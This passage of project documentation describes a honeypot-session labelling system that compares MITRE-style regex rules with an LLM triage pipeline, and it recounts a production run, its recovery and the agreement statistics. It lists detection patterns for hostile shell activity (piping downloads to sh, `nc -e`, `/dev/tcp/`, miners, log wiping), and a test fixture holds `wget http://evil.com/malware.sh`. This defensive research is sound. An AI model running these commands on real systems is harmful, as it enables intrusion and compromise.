- **Impact** — `rm -rf /`, `rm *`, `kill -9`, `dd if=`, `mkfs`,
  `shutdown|reboot|halt|poweroff`, `init 0/6`
- **Execution** — `./anything`, `bash -c`, `sh -c`, `perl -e`, `python -c`,
  `source`, `nohup`, `eval`, and a dropper combo `chmod.*&&.*\./`
- **Command and Control** — `wget…|sh`, `curl…|sh`, `nc -e`, `/dev/tcp/`,
  python/perl reverse-shell shapes, `tftp`, `wget -O`, `curl -o`, `base64 -d`
- **Resource Hijacking** — `xmrig`, `stratum+tcp://`, `minerd`, `cpuminer`,
  `--donate-level`, `nicehash`, `cryptonight`
- **Defense Evasion** — `history -c`, `unset HIST*`, `HISTSIZE=0`, removing
  `/var/log` or `.bash_history`, log truncation, `systemctl stop`,
  `service … stop`, `ufw disable`, `setenforce 0`, `iptables -F`

**Level 2 (Medium)** — footholds without immediate damage:

- **Persistence** — `crontab -e/-l`, `/etc/cron*`, `/etc/rc.local`,
  `/etc/init.d/`, `systemctl enable`, `.bashrc`/`.profile` appends,
  `authorized_keys`
- **Privilege Escalation** — `sudo `, `su `, `chmod +x`, `chmod 777`, `chown`,
  setuid/setgid bits
- **Credential Access** — `/etc/shadow`, `>> /etc/passwd`, `passwd <user>`,
  `useradd`, `adduser`, `usermod`

**Level 3 (Low)** — **Discovery** only, 27 patterns: `uname`, `cat /etc/passwd`,
`cat /etc/*`, `whoami`, `id`, `hostname`, `ifconfig`, `ip addr`, `netstat`,
`ss -`, `ps aux`, `w`, `who`, `last`, `df`, `free`, `lscpu`, `nproc`, `uptime`,
`ls -la`, `find /`, `env`/`printenv`, `dmesg`, `cat /proc/cpuinfo`, `dmidecode`,
`virt-what`/`systemd-detect-virt`, `.dockerenv`/`/proc/1/cgroup`.

That last pair is a nice touch: checking for container indicators is a strong
signal of an operator probing whether they landed in a sandbox.

#### 6.5.3 The labeling algorithm, step by step

1. **No commands?** → `Initial Access (Failed)` if auth failed, else
   `No Action`. Both level 3, sophistication 1. *Roughly 99% of the corpus
   exits here.*
2. **Normalize** (`_normalize_commands`). Rather than brute-forcing every
   8-character substring as potential base64 (too noisy), it only decodes when
   there is an explicit decode context: `echo XXX | base64 -d`,
   `base64 -d <<< XXX`, `echo -e '\xNN…' | sh`, or ≥3 hex escapes in one
   command. Successfully decoded payloads are **appended** to the command list
   so patterns scan both the wrapper and the payload. Sets
   `obfuscation_detected`.
3. **Behavior tag** (`_get_behavior_tag`). If the minimum inter-command gap is
   <0.05 s → `MACHINE_SPEED` immediately (pasted block). Otherwise >2.0 cmd/s →
   `MACHINE_SPEED`; <0.3 cmd/s → `HUMAN_SPEED`; between → `UNKNOWN_SPEED`. The
   2.0 threshold was lowered from 5.0 with the reasoning that Cowrie's
   simulated execution delays slow even automated sessions.
4. **Scan** every command against every pattern, collecting
   `(level, tactic, pattern_name)`.
5. **No matches?** → `_classify_unknown`. Returns `Unknown Activity (High)` if
   *any* command exceeds 50 characters, contains a shell metacharacter
   (`| > < ; & $ \``), or if ≥5 commands are not near-misses of known binaries;
   else `Unknown Activity (Low)`. Typo detection uses Levenshtein distance ≤2
   against a 90-command builtin list, capped at 3 for speed.
6. **Severity = `min(level)` over all matches.** This is the pivotal design
   choice. One `./x` anywhere in a 200-command session pins the whole session at
   level 1.
7. **Kill-chain upgrade.** If the tactic set is a superset of any of nine
   dangerous combos — `{Discovery, Persistence, Execution}`,
   `{Discovery, Persistence, Impact}`, `{Discovery, Execution, Impact}`,
   `{Discovery, Privilege Escalation, Persistence}`,
   `{Command and Control, Execution}`, `{Command and Control, Impact}`,
   `{Credential Access, Persistence}`,
   `{Command and Control, Resource Hijacking}`,
   `{Execution, Resource Hijacking}` — the level is forced to 1 and, if the
   primary tactic is not already a level-1 tactic, it is renamed
   **`Kill Chain Detected`**.
8. **Primary tactic** = first match in a fixed priority list at the winning
   level: L1 `[Impact, Execution, Command and Control, Resource Hijacking,
   Defense Evasion]`, L2 `[Persistence, Privilege Escalation, Credential
   Access]`, L3 `[Discovery]`.
9. **Sophistication 1–5** (`_compute_sophistication_score`): 1 = nothing
   matched; 2 = recon only; 3 = level ≤2 (downloads/persistence); 4 = ≥3
   tactics or kill chain or obfuscation; 5 = kill chain **and** obfuscation
   **and** ≥4 tactics.

#### 6.5.4 Why Pipeline A's level distribution is bimodal

Over the whole corpus: **L1 = 3,340, L2 = 62, L3 = 11,708,089.**

Sixty-two level-2 sessions out of 11.7 million is not a bug in the counting; it
falls out of step 6 combined with the pattern catalog. A level-2 label requires
a session to match a Persistence/PrivEsc/CredAccess pattern **and no level-1
pattern at all**. But `chmod +x` (L2 PrivEsc) is almost always accompanied by
`./payload` (L1 Execution); `authorized_keys` writes usually involve a
redirect that co-occurs with a download; `useradd` sessions typically also run
something. The `min()` rule collapses nearly every mixed session to level 1.

**Consequence for the comparison:** Pipeline A effectively emits a binary
"dangerous / not dangerous" signal while Pipeline B uses all three levels
(L1 3,629 / L2 4,065 / L3 820 on the dual-labeled set). A large share of the
observed "level disagreement" is a scale-usage mismatch, not a disagreement
about facts. Any published level comparison must say this explicitly, and
weighted (ordinal) kappa rather than raw agreement is the right statistic —
which `compute_ground_truth_metrics.py` already implements.

### 6.6 Session exporter (`src/cowrie_dataset/export/session_exporter.py`)

The contract module: both pipelines must see identical input, so exactly one
function builds that input.

`export_session(session, geo_enricher=None)` extracts message + host features,
merges them (`{**msg, **host}`), optionally extracts geo into a *separate*
`geo` block, runs `label_session()` for Pipeline A labels, derives
`protocol = "telnet" if dst_port == 23 else "ssh"`, reshapes login attempts
from tuples into dicts, and stamps `ingested_at` with a UTC ISO timestamp.

`export_sessions_to_jsonl(sessions, path, geo_enricher, progress_callback)`
writes one compact JSON object per line (`json.dumps(..., default=str)`, which
is how `datetime` objects inside `commands` survive serialization).
`load_sessions_from_jsonl(path)` yields plain dicts back.

Note the asymmetry with the CLI's nested path: **geo features are not merged
into `features` here**, only into `geo`. In `cli.py::build_session_document`
they *are* merged into `features`. Another face of the two-shapes problem.

### 6.7 Statistical anomaly detector (`src/cowrie_dataset/anomaly/statistical_detector.py`)

The economic gate. Without it, running an LLM over 11.7M sessions is
infeasible; with it, 0.38% of sessions reach a model.

**`FeatureStats`** implements Welford's online algorithm (Knuth TAOCP vol. 2):

```python
count += 1
delta   = value - mean
mean   += delta / count
delta2  = value - mean
m2     += delta * delta2
variance = m2 / (count - 1)
```

Numerically stable and O(1) memory — you can train over 11.7M sessions in a
single streaming pass. `z_score` guards against constant features by returning
0.0 when `std_dev < 0.0001`.

**The 13 gate features** (`ANOMALY_FEATURES`):

```
F44_duration              F38_messages_per_sec      extra_chars_per_sec
extra_num_commands        extra_unique_commands     extra_avg_cmd_length
F28_keyword_wget          F29_keyword_tftp          F14_keyword_chmod
F16_keyword_rm            F17_keyword_history       extra_keyword_curl
F46_download_count
```

Three families: timing, command volume, and specific attack indicators. Note
these names differ from the ones in `docs/IMPLEMENTATION_PLAN.md` §2.1 (which
lists `F44_session_duration`, `F36_messages_per_sec`, `F28_wget`,
`F46_file_transfer`) — the plan predates the final feature naming. **Trust the
code, not the plan.**

**Detection** (`check`): a session is anomalous if **any single feature**
exceeds `|z| > 3.0`. The `score` is the maximum absolute z across features, and
`reasons` is a human-readable list like
`F28_keyword_wget=4 (high, z=12.3)`. Before training completes
(`min(count) < min_samples`, default 100), *everything* is flagged anomalous —
a fail-open design that is correct for a pre-filter.

`save`/`load` round-trip through JSON, persisting `count`, `mean`, `m2`,
`std_dev` per feature plus the threshold and trained flag (the artifact lives at
`src/anomaly_stats.json` on the server, not in the repo).

`add_anomaly_flag(session, detector)` mutates a session dict in place, adding:

```json
"statistical_anomaly": {"is_anomaly": bool, "score": float,
                        "reasons": [...], "z_scores": {...}}
```

**Statistical caveat worth stating in the paper.** Command-count and keyword
features in this corpus are extremely zero-inflated and heavy-tailed — nothing
like Gaussian. A z-score gate on such distributions is not a "99.7% coverage"
threshold in any real sense; it is a *heuristic outlier rule* whose empirical
selectivity happened to be 0.38%. Describe it as tuned, not as a statistical
guarantee.

### 6.8 Pipeline B — the agent layer (`src/cowrie_dataset/agents/`)

Four modules: `base.py` (transport), `hunter.py` (triage), `analyst.py`
(classification), `runner.py` (orchestration).

#### 6.8.1 `base.py` — `AgentConfig`

```python
provider = "gemini"            # "anthropic" | "openai" | "gemini"
model    = "gemini-2.5-flash"
api_key  = None                # falls back to env by provider
project_id = None              # GOOGLE_CLOUD_PROJECT → use Vertex AI
location = "us-central1"
max_tokens  = 4096             # was 1024 — see §8.4
temperature = 0.1
requests_per_minute = 500
retry_attempts = 3
retry_delay = 2.0
input_cost_per_1k  = 0.0       # ← zero for the Flash preset
output_cost_per_1k = 0.0
```

Three presets: `gemini_flash_config()` (500 RPM, zero cost),
`gemini_pro_config()` (60 RPM, $1.25/$5 per 1M),
`claude_sonnet_config()` (50 RPM, $3/$15 per 1M).

#### 6.8.2 `base.py` — `BaseAgent`

Abstract; subclasses implement `system_prompt`, `format_input`, `parse_output`.
Everything else is shared:

- **Lazy client creation** (`_get_client`) so importing the module never
  requires an SDK you are not using. For Gemini, `project_id` present →
  `genai.Client(vertexai=True, project=…, location=…)`; absent →
  `genai.Client(api_key=…)`.
- **Thread-safe sliding-window rate limiter** (`_wait_for_rate_limit`): keeps
  request timestamps from the last 60 s under a lock, sleeps *outside* the lock
  so other workers are not blocked. **Each agent instance has its own window**,
  so a runner with a Hunter and an Analyst permits up to 2× the configured RPM
  in aggregate.
- **Quota-aware retry**: `_is_quota_error` matches `429`, `RESOURCE_EXHAUSTED`,
  `quota`, `rate limit`. `_parse_retry_delay` pulls Google's suggested delay out
  of the error text (`'retryDelay': '32s'` or `Please retry in 12.5s`), capped
  at 60 s. Non-quota errors use linear backoff `retry_delay × (attempt + 1)`.
  On final failure the error message includes a pointer to Google's rate-limit
  docs.
- **Unified call** (`_call_api`) returning `(text, input_tokens, output_tokens)`
  for all three providers. Gemini uses `generate_content` with
  `system_instruction` and reads `usage_metadata`.
- **`analyze(session)`** wraps it all, timing the call, computing
  `cost = in/1000 × input_price + out/1000 × output_price`, and returning an
  `AgentResponse`.

**Critical subtlety:** `AgentResponse.success` is `True` whenever the *API call*
succeeded. `parse_output` implementations never raise — they return a fallback
dict. So **a successful-looking response can contain a total parse failure.**
This is precisely what hid the `max_tokens` bug for an entire production run
(§8.4), and it is why the forward plan mandates that parse failures be counted
and logged loudly.

#### 6.8.3 `hunter.py` — triage

System prompt: a threat hunter deciding RELEVANT vs NOISE.

- **RELEVANT:** clear attack progression, system-awareness commands, payload
  downloads, lateral movement, human signals (typo correction, adaptation),
  anti-forensics, persistence mechanisms.
- **NOISE:** random garbage, pure brute force with nothing after login, scanner
  fingerprinting only, bots stuck in loops, empty sessions, a single recon
  command and nothing else.

Input is deliberately thin — session ID, duration, auth flag, session type,
anomaly reasons and score, Pipeline A's level/tactic/patterns, and up to 50
command strings. Output is a single flat JSON object:
`{"verdict", "confidence", "reasoning"}`.

`parse_output` searches for `\{[^{}]+\}` (no nested braces), and on failure
falls back to a keyword scan; if `RELEVANT` does not appear, it returns
**NOISE with confidence 0.5**. See §13.2 — this default biases the filter rate.

#### 6.8.4 `analyst.py` — classification

The expensive stage; only RELEVANT sessions reach it. Its system prompt
enumerates the twelve MITRE tactics with representative technique IDs, and four
sophistication levels (SCRIPT_KIDDIE / INTERMEDIATE / ADVANCED / APT).

Input includes session metadata, geo string, full auth details (username,
password, SSH version, HASSH), up to 100 timestamped commands with `+`/`-`
success markers, the downloads block, Pipeline A's labels as an explicit
baseline, and the anomaly info.

Requested output:

```json
{"threat_level": 1-3, "primary_tactic": "...", "all_tactics": [...],
 "technique_ids": ["T1059.004", ...], "sophistication": "SCRIPT_KIDDIE|…",
 "intent": "...", "reasoning": "...", "confidence": 0.0-1.0, "iocs": [...]}
```

`_extract_json(text)` — added during error recovery — strips markdown fences,
tries a direct parse, then brace-matches the outermost `{…}`. This is strictly
better than the Hunter's regex and should be shared.

The fallback on parse failure returns `threat_level=2`,
`primary_tactic="Unknown"`, `confidence=0.0`, and
`reasoning="couldn't parse response: <first 100 chars>"`. **The signature of a
parse failure in the data is therefore `primary_tactic == "Unknown"` plus
`"parse"` in the reasoning** — exactly the query used to find and reprocess
7,370 sessions.

Two prompt-level problems (§13.6, §13.7): the geo line reads `geo["country"]`
and `geo["continent"]` while the actual keys are `F48_country_name` /
`F47_continent_code`, so geography is always `? (?)`; and nothing validates
that `primary_tactic` is a member of the tactic enum, which is how
**"Ingress Tool Transfer" (a technique, T1105, not a tactic) appears as a
primary tactic 141 times.**

#### 6.8.5 `runner.py` — orchestration

```
session → is_anomaly? ──no──> {"skipped": true}          (no API cost)
             │yes
             ▼
        Hunter.analyze()
             ├─ failure ──> {"error": …, "stage": "hunter"}
             ├─ NOISE ────> {hunter_verdict: NOISE, analyst_verdict: null}
             └─ RELEVANT
                  ▼
             Analyst.analyze()
                  ├─ failure ──> {"error": …, "stage": "analyst"}
                  └─ success ──> full analyst_verdict block
```

`AgentRunnerStats` is updated under a lock at every exit path (sessions
processed / anomalous / sent to hunter / marked relevant / sent to analyst,
cumulative latency, cumulative cost, errors). `get_stats()` derives anomaly
rate, hunter filter rate, average latency and average cost per anomalous
session.

**`AgentPipelineResult.to_dict()` is lossy** and this shaped the stored data:

```python
{"was_anomaly", "hunter_verdict", "analyst_verdict", "pipeline_metrics"}
```

`hunter_confidence`, `hunter_reasoning`, `skipped`, `error`, and `stage` are all
computed and then **dropped** before persistence. A skipped session is
identifiable only by `was_anomaly == false`; an errored session only by
`hunter_verdict == null`. That null-verdict signal is exactly how the 27,194
failed sessions were later found — so the lossiness was survivable, but it
means the Hunter's confidence scores from the production run **do not exist
anywhere** and cannot be analyzed (§13.8).

### 6.9 Elasticsearch sink (`src/cowrie_dataset/sinks/elasticsearch_sink.py`)

`SESSION_INDEX_MAPPING` — a hand-written mapping (1 shard, 0 replicas, 5 s
refresh) with correct types throughout: `src_ip` as `ip`, timestamps as `date`,
identifiers and enums as `keyword`, free text (`reasoning`, `intent`, command
inputs) as `text`, `features` as a dynamic object, and `z_scores` as a dynamic
sub-object. It covers `statistical_anomaly`, `labels_rule_based` (including all
v2/v3 fields), `labels_agentic` (including the nested `analyst_verdict` and
`pipeline_metrics`), and `label_comparison`.

`ElasticsearchSink` buffers to `bulk_size` then flushes via the `bulk` helper
with `raise_on_error=False` so a bad document cannot abort a multi-hour run;
errors are counted and the first five logged. `add()` stamps
`meta.ingested_at`. `refresh()` forces searchability; the class is a context
manager that flushes and closes.

`DryRunSink` is a drop-in fake that counts documents and optionally pretty-
prints the first N — used by `cli.py --dry-run`.

**Document ID:** `f"{doc['session_id']}_{doc['timing']['start_ts']}"`. For flat
documents (which is what `labeled_sessions.jsonl` contains) there is no
`timing` block, so every ID degenerates to `"<session_id>_"`. See §13.4 for why
this matters and roughly how many documents it silently merges.

### 6.10 CLI (`src/cowrie_dataset/cli.py`)

Entry point `cowrie-ingest` / `python -m cowrie_dataset.cli`.

| Flag | Effect |
|---|---|
| `--location` / `-l` | Process one sensor |
| `--all` / `-a` | Process all configured sensors |
| `--limit` / `-n` | Cap files per sensor (testing) |
| `--dry-run` / `-d` | Use `DryRunSink`, no ES writes |
| `--print-docs` / `-p` | Print sample documents (with `--dry-run`) |
| `--create-index` / `-c` | Create the index first |
| `--delete-index` | Delete before creating (destructive) |
| `--es-host`, `--data-dir` | Override `.env` |
| `--export` / `-e` | **JSONL export mode** instead of ES |
| `--verbose` / `-v` | Debug logging |

Two distinct code paths:

1. **ES path** — streams sensor → parser → aggregator →
   `build_session_document()` (nested shape, geo merged into `features`) →
   sink. Constant memory, logs every 1,000 sessions.
2. **Export path** — `all_sessions.extend(...)` accumulates **every Session
   object in RAM** before writing. At 11.7M sessions this is a very large
   footprint and is the likely origin of the memory pressure seen during the
   production run (§13.10).

---

## 7. Scripts reference

### `scripts/run_mvp_test.py`
Standalone smoke test; adds `src/` to `sys.path` so it runs without installing
the package. Parses a file or the first N files of a directory, aggregates,
extracts features, labels, and prints a summary. Use this first on any new data.

```bash
python scripts/run_mvp_test.py /opt/honeypot/ssh-amsterdam --limit 10 --print
```

### `scripts/verify_session_schema.py`
Schema gate. With no arguments it synthesizes a session (root/password123,
`uname -a`, `cat /etc/passwd`, `wget http://evil.com/malware.sh`), exports it,
and asserts the required fields, label fields (`level`, `primary_tactic`,
`all_tactics`, `matched_patterns`), required features (`F38_messages_per_sec`,
`F44_duration`, `extra_num_commands`), and types. With `--input file.jsonl` it
validates every line and reports a success rate. Exits non-zero on any error.

Note it validates the **flat** schema only — running it against nested
documents reports false failures.

### `scripts/train_anomaly_detector.py`
One streaming pass over exported sessions, updating Welford stats, then saves
JSON. Prints per-feature `n / mean / std`.

```bash
python scripts/train_anomaly_detector.py -i src/sessions_all.jsonl \
    -o src/anomaly_stats.json --z-threshold 3.0 --min-samples 100
```

### `scripts/run_agent_pipeline.py`
The Pipeline B driver. Loads `.env` manually (without clobbering existing env
vars) before importing anything, so `GOOGLE_CLOUD_PROJECT` is visible to
`AgentConfig`. Flags: `--input`, `--output`, `--anomaly-stats`, `--z-threshold`,
`--model`, `--dry-run`, `--limit`, `--concurrency` (default 50),
`--skip-non-anomalous`.

Concurrency model: a `ThreadPoolExecutor` submits `process_session` per line;
completed futures are drained whenever the pending set exceeds
`2 × concurrency`; a `threading.Lock` serializes writes. With no
`--anomaly-stats`, every session is flagged anomalous — useful for small tests,
ruinous on the full corpus.

### `scripts/index_to_elastic.py`
Reads labeled JSONL, computes `label_comparison` when both label sets are
present, and bulk-indexes. `compute_label_comparison` emits `tactics_agree`
(case-insensitive string equality), `levels_agree`, `rule_level`, `agent_level`,
`level_difference`. Flags: `--create-index`, `--delete-index`, `--bulk-size`,
`--limit`, ES connection overrides.

### `scripts/retry_errored_sessions.py`
Three subcommands, written during the recovery effort:

- **`retry`** — re-run full Hunter→Analyst on sessions with a null hunter
  verdict, at reduced concurrency (default 20), with `skip_non_anomalous=False`.
- **`reanalyze`** — Analyst only, for sessions that passed the Hunter but whose
  analyst JSON failed to parse. Rebuilds `analyst_verdict` in place and *adds*
  the retry's cost and latency to the existing `pipeline_metrics`.
- **`merge`** — load the retried file into a `session_id → record` dict, stream
  the original, replace `labels_agentic` on matches, write a new file. Warns if
  fewer records merged than were loaded.

Agent imports are deferred into `_import_agents()` so `merge` works on a machine
without the SDKs installed — a fix made after the first merge attempt died on
`ModuleNotFoundError`.

### `scripts/analyze_disagreements.py`
Streams `labeled_sessions.jsonl` and produces the agreement report: pipeline
funnel counts, tactic/level agreement rates, the four hypothesis metrics, tactic
and level distributions, both confusion matrices, and up to `--sample-size`
(default 50) worked examples per category. `--es` mode is a **stub that prints a
message and exits 1**. Output: `src/disagreement_results.json`.

### `scripts/cost_benefit_analysis.py`
Streams the same file for economics: rule-based coverage and level
distribution, agent funnel, hunter filter rate, agent level distribution, novel
findings, cost totals and percentiles, latency, 1M-session projections, and the
H4 check. Output: `src/cost_report.json`.

**Definition to memorize:** a *novel finding* is a session where
`matched_patterns` is empty **and** the agent assigned level ≤ 2. It measures
"the agent saw a threat where the rules saw nothing at all."

### `scripts/analyze_patterns.py`
Annotation-plan Phase 1. For each significant confusion-matrix cell — the eight
named focus cells, plus any cell with ≥50 sessions, plus the top 20 by size —
profiles: session-type distribution, command-count buckets (0 / 1-5 / 6-20 /
21+), most common command heads, agent confidence distribution, agent
sophistication, Pipeline A sophistication score, sensor distribution, auth
success, download/upload counts, mean duration, and 10 sample session IDs. Also
profiles agreement cells and the novel-detection population separately.

The purpose is diagnostic: *are disagreements systematic or scattered?*
Systematic ones (one pipeline consistently mishandling one session type) are the
publishable finding.

### `scripts/extract_annotation_sample.py`
Annotation-plan Phase 2. Three passes over the master file:

1. **Classify** — read every dual-labeled session, assign bucket(s), and record
   its **byte offset**. Only offsets and session IDs are retained, so memory
   stays bounded on a 38 GB file.
2. **Sample** — draw per-bucket quotas with `random.Random(seed)` (default seed
   42). Deduplicate sessions landing in multiple buckets by priority
   `disagreement > novel > level_only > agreement`, sort by offset, assign
   contiguous `annotation_id`s.
3. **Export** — seek to selected offsets and write two records per session.

Outputs `annotation_sample_blind.jsonl` (no pipeline labels),
`annotation_sample_full.jsonl` (with labels — the answer key), and
`annotation_sample_metadata.json` (seed, populations, quotas, final composition).
`--total N` rescales all quotas proportionally.

### `scripts/compute_ground_truth_metrics.py`
Annotation-plan Phase 4, and the statistical heart of the project. Pure stdlib —
no numpy, no scipy, no sklearn — which makes it trivially portable and
auditable. Implements:

- `resolve_ground_truth` — majority vote across annotators, ties broken by mean
  confidence; FN-risk is `any()` across annotators (deliberately cautious).
- `confusion_matrix`, `classification_report` (per-class precision/recall/F1 +
  support, accuracy, macro-F1, weighted-F1).
- `mean_absolute_error` for ordinal levels.
- `mcnemar` — **exact two-sided binomial** on discordant pairs, not the
  chi-square approximation. Correct at n≈400 where discordant counts are small.
- `bootstrap_f1_diff` — percentile method, 10,000 resamples, for both macro and
  weighted F1.
- `cohens_kappa` — unweighted (nominal, for tactics) and **linear-weighted**
  (ordinal, for levels).
- `non_inferiority_verdict` — turns a CI into one of four verdicts: B superior /
  A superior / B non-inferior within δ / inconclusive.
- False-negative rate over human-flagged high-risk sessions, where "detected"
  means tactic ∉ {∅, No Action} **and** level ≤ 2.
- Novel-detection validation: for bucket-C samples, how often the agent's tactic
  matched the human's, and how often the human saw a real threat at all.

```bash
python scripts/compute_ground_truth_metrics.py \
  --annotations annotation_results_jake.jsonl annotation_results_partner.jsonl \
  --sample-full annotation_out/annotation_sample_full.jsonl \
  --output ground_truth_metrics.json
```

### `scripts/annotate/index.html`
A single-file, dependency-free annotation UI. Loads the blind JSONL through a
file input (nothing is uploaded; all processing is client-side), renders one
session at a time with formatted commands, auth details, downloads and client
info, and collects: primary tactic (15-item dropdown), threat level (1–3),
confidence (1–5), a false-negative-risk checkbox, and free-text notes.

Progress auto-saves to `localStorage` keyed by filename + size, so closing the
tab is safe. Export downloads `annotation_results_<annotator>.jsonl`. Keyboard
shortcuts: `s` save & next, `Shift+S` skip, `j` previous, `k` next. A collapsible
jump-bar navigates to any session.

---

## 8. The production run

### 8.1 What was run

The full corpus — 11,711,491 sessions across six sensors — was exported to
`src/sessions_all.jsonl` (~31 GB), the anomaly detector was trained over it, and
`run_agent_pipeline.py` was run at concurrency 50 against Gemini 2.5 Flash,
producing `src/labeled_sessions.jsonl` (~38 GB).

Aggregate model latency was **344,447 seconds ≈ 95.7 hours** at a mean of
**7,779 ms per gated session**; wall-clock was far lower thanks to 50-way
concurrency.

### 8.2 The three failure classes

| Failure | Count | Symptom | Root cause |
|---|---|---|---|
| Hunter API failure | 27,194 | `hunter_verdict == null` | transient API/quota errors that exhausted 3 retries |
| Analyst parse failure (first wave) | 2,977 | `primary_tactic == "Unknown"`, reasoning contains "parse" | markdown-fenced JSON the naive regex could not read |
| Analyst truncation (second wave) | 7,370 | same signature | **`max_tokens = 1024`** truncating the response mid-JSON |

### 8.3 The recovery, in order

Reconstructed from `docs/error_recovery_debrief.md`.

**Step 1 — merge the 2,977 reparsed analyst results.** Failed first on
`ModuleNotFoundError: cowrie_dataset` because the top-level agent import ran
even for the `merge` subcommand; fixed by deferring the import. Then failed on
**disk exhaustion** — a 125 GB disk at 83% cannot hold a second copy of a 38 GB
file. `src/sessions_all.jsonl` (31 GB) was deleted to make room. The merge then
processed 11,711,491 lines and replaced 2,980 records (3 more than expected,
because 3 session IDs appear twice in the master file). *This merge later turned
out to be ineffective — the reparsed records were still truncated.*

**Step 2 — retry the 27,194 hunter failures.** Four attempts:

- **Attempt 1** (concurrency 50): 9,551/27,194 in ~63 minutes, then **OOM-killed
  with no error message**. Output preserved.
- **Attempt 2** (concurrency 20, 17,633 remaining): ran at ~10 sessions/min —
  far slower than expected — because `GOOGLE_CLOUD_PROJECT` was commented out in
  `.env`, so traffic went to AI Studio's free tier rather than Vertex. Stopped
  at 682 records.
- **Attempt 3** (after uncommenting the project): throughput still ~2–3 it/s;
  stopped at 138 records to fix the ADC quota project.
- **Attempt 4** (after the ADC fix): completed all 15,485 remaining.

Concatenating and deduplicating the four output files: 33,100 lines →
**27,194 unique session IDs, all accounted for.** The merge back reported 27,260
replacements — 66 more than expected, again from duplicate session IDs.

**Step 3 — discover the real analyst bug** (§8.4), fix it, and reanalyze all
7,370 sessions matching the parse-failure signature. Post-fix spot check of the
first 134 results: 132 parsed with real tactics = **98.5% real success.** Merged
back: 7,370 replacements.

**Step 4 — final hunter sweep.** 3,271 sessions had failed on *both* the
original run and the first retry. This run reported **100% success** (3,271
processed, 3,271 verdicts, 0 still errored, 942 RELEVANT).

### 8.4 The `max_tokens` bug (the most instructive failure)

After the first retry and merge, `analyze_disagreements.py` showed **93% of
analyst results were parse failures**, all with `primary_tactic: "Unknown"` and
reasoning beginning `couldn't parse response: ```json…`.

The `_extract_json` fix from the prior session was working correctly. The
problem was upstream: `AgentConfig.max_tokens` defaulted to **1024**, and the
Analyst prompt asks for structured JSON containing reasoning, tactic lists,
technique IDs, and IOCs. Responses were being **truncated mid-object**, so there
was no valid JSON to extract.

Three things made this hard to see:

1. `parse_output` never raises — it returns a fallback dict.
2. `AgentResponse.success` reflects only whether the *API call* succeeded, so
   the runner recorded `success=True`.
3. A pre-fix reanalysis run therefore reported *"Processed: 7370, Succeeded:
   7367, Still errored: 3"* — **and every one of those "successes" was still a
   parse failure.**

The fix was `max_tokens: 1024 → 4096` (commit `c3579eb`), verified live: with
4096, a 262-token response parsed correctly as
`"primary_tactic": "Initial Access"`.

This single incident is the direct origin of two standing project rules:
*"surface errors loudly — never default to Unknown without flagging"* and
*"every LLM-output-parsing step must log parse failures with counts."*

### 8.5 Final state after recovery

```
Total sessions:              11,711,491
Statistical anomalies:           44,280
Null hunter verdicts:                 0   ← 100% hunter recovery
Verdict distribution:   NOISE 35,447 | RELEVANT 8,833
Analyst OK:                       8,335   (94.4% of RELEVANT)
Analyst parse failures:             179   (2.0% of RELEVANT)
Analyst missing/other:           35,766   (35,447 NOISE + 319 structural)
```

The 319 "structural" cases are RELEVANT sessions where an `analyst_verdict`
object exists but lacks a `level` field or is otherwise malformed. Combined with
the 179 parse failures, that is why the dual-labeled comparison set is
**8,514**, not 8,833.

### 8.6 Data-safety debt incurred

Stated plainly because it constrains everything downstream:

- **No backup of `src/labeled_sessions.jsonl` exists.** Each of the five merges
  wrote a new file and `mv`'d it over the original.
- **`src/sessions_all.jsonl` (the 31 GB pre-labeling export) was deleted.**
  Regenerating it requires re-running the full parse/aggregate/export from raw
  logs.
- Consequently the exact pre-recovery state of the corpus is unrecoverable, and
  the recovery cannot be independently audited from artifacts.

This is why constraint #5 of the forward plan — *"preserve raw outputs; every
pipeline run writes its own sidecar JSONL"* — exists.

---

## 9. Results in full

All figures from `src/disagreement_results.json` and `src/cost_report.json`,
generated after the complete recovery.

### 9.1 The funnel

| Stage | Count | % of previous | % of total |
|---|---:|---:|---:|
| Total sessions | 11,711,491 | — | 100% |
| Pipeline A pattern match | 39,027 | — | 0.333% |
| Statistical anomalies (gate) | 44,280 | 0.378% | 0.378% |
| Sent to Hunter | 44,280 | 100% | 0.378% |
| → NOISE | 35,447 | 80.05% | 0.303% |
| → RELEVANT | 8,833 | 19.95% | 0.075% |
| Sent to Analyst | 8,833 | 100% | 0.075% |
| Usable dual labels | 8,514 | 96.4% | 0.073% |

**Overall selectivity: 1 session in 1,376 ever reaches an LLM analyst.**

### 9.2 Agreement

| Measure | Agree | Disagree | Rate |
|---|---:|---:|---:|
| Primary tactic | 3,532 | 4,982 | **41.5%** |
| Threat level | 3,504 | 5,010 | **41.2%** |

### 9.3 Level confusion matrix (rows = Pipeline A, cols = Pipeline B)

| | Agent L1 | Agent L2 | Agent L3 | Row total |
|---|---:|---:|---:|---:|
| **Rule L1** | **2,640** | 518 | 3 | 3,161 |
| **Rule L2** | 12 | **47** | 0 | 59 |
| **Rule L3** | 977 | 3,500 | **817** | 5,294 |
| Column total | 3,629 | 4,065 | 820 | 8,514 |

Read the L3 row: of 5,294 sessions Pipeline A called low-severity, the agent
upgraded **66% to medium** and **18% to high**, leaving only 15% agreed-low.
Read the L1 row: agreement is strong (84%), with 16% downgraded to medium.

Read the L2 row and the design flaw jumps out: **59 sessions total.** Pipeline A
essentially does not use the middle of its own scale (§6.5.4).

### 9.4 Tactic distributions (dual-labeled set)

| Pipeline A tactic | n | | Pipeline B tactic | n |
|---|---:|---|---|---:|
| Discovery | 3,615 | | Initial Access | 3,805 |
| Command and Control | 3,004 | | Discovery | 2,361 |
| No Action | 1,005 | | Command and Control | 1,261 |
| Unknown Activity (Low) | 398 | | Execution | 547 |
| Unknown Activity (High) | 276 | | Persistence | 182 |
| Impact | 73 | | Unknown | 179 |
| Execution | 70 | | *Ingress Tool Transfer* | *141* |
| Persistence | 53 | | Impact | 23 |
| Resource Hijacking | 13 | | Defense Evasion | 13 |
| Credential Access | 3 | | Privilege Escalation | 2 |
| Privilege Escalation | 3 | | | |
| Defense Evasion | 1 | | | |

Two structural observations:

- **Pipeline A never emits `Initial Access` for a successful login.** Its
  vocabulary has `Initial Access (Failed)` for failed auth and `No Action` for
  successful auth with no commands. Pipeline B's most-used label is `Initial
  Access` (3,805, 45%). A large fraction of the "disagreement" is these two
  incompatible vocabularies, not a factual dispute.
- **`Ingress Tool Transfer` (141) is not a MITRE tactic** — it is technique
  T1105 under Command and Control. The Analyst emitted an out-of-enum value and
  nothing caught it (§13.7).

### 9.5 Top tactic confusions

| Pipeline A | Pipeline B | n | Most likely reading |
|---|---|---:|---|
| Discovery | Initial Access | 1,405 | Are these actually `success_no_commands`? If so the agent is right and A's Discovery patterns fired on something incidental |
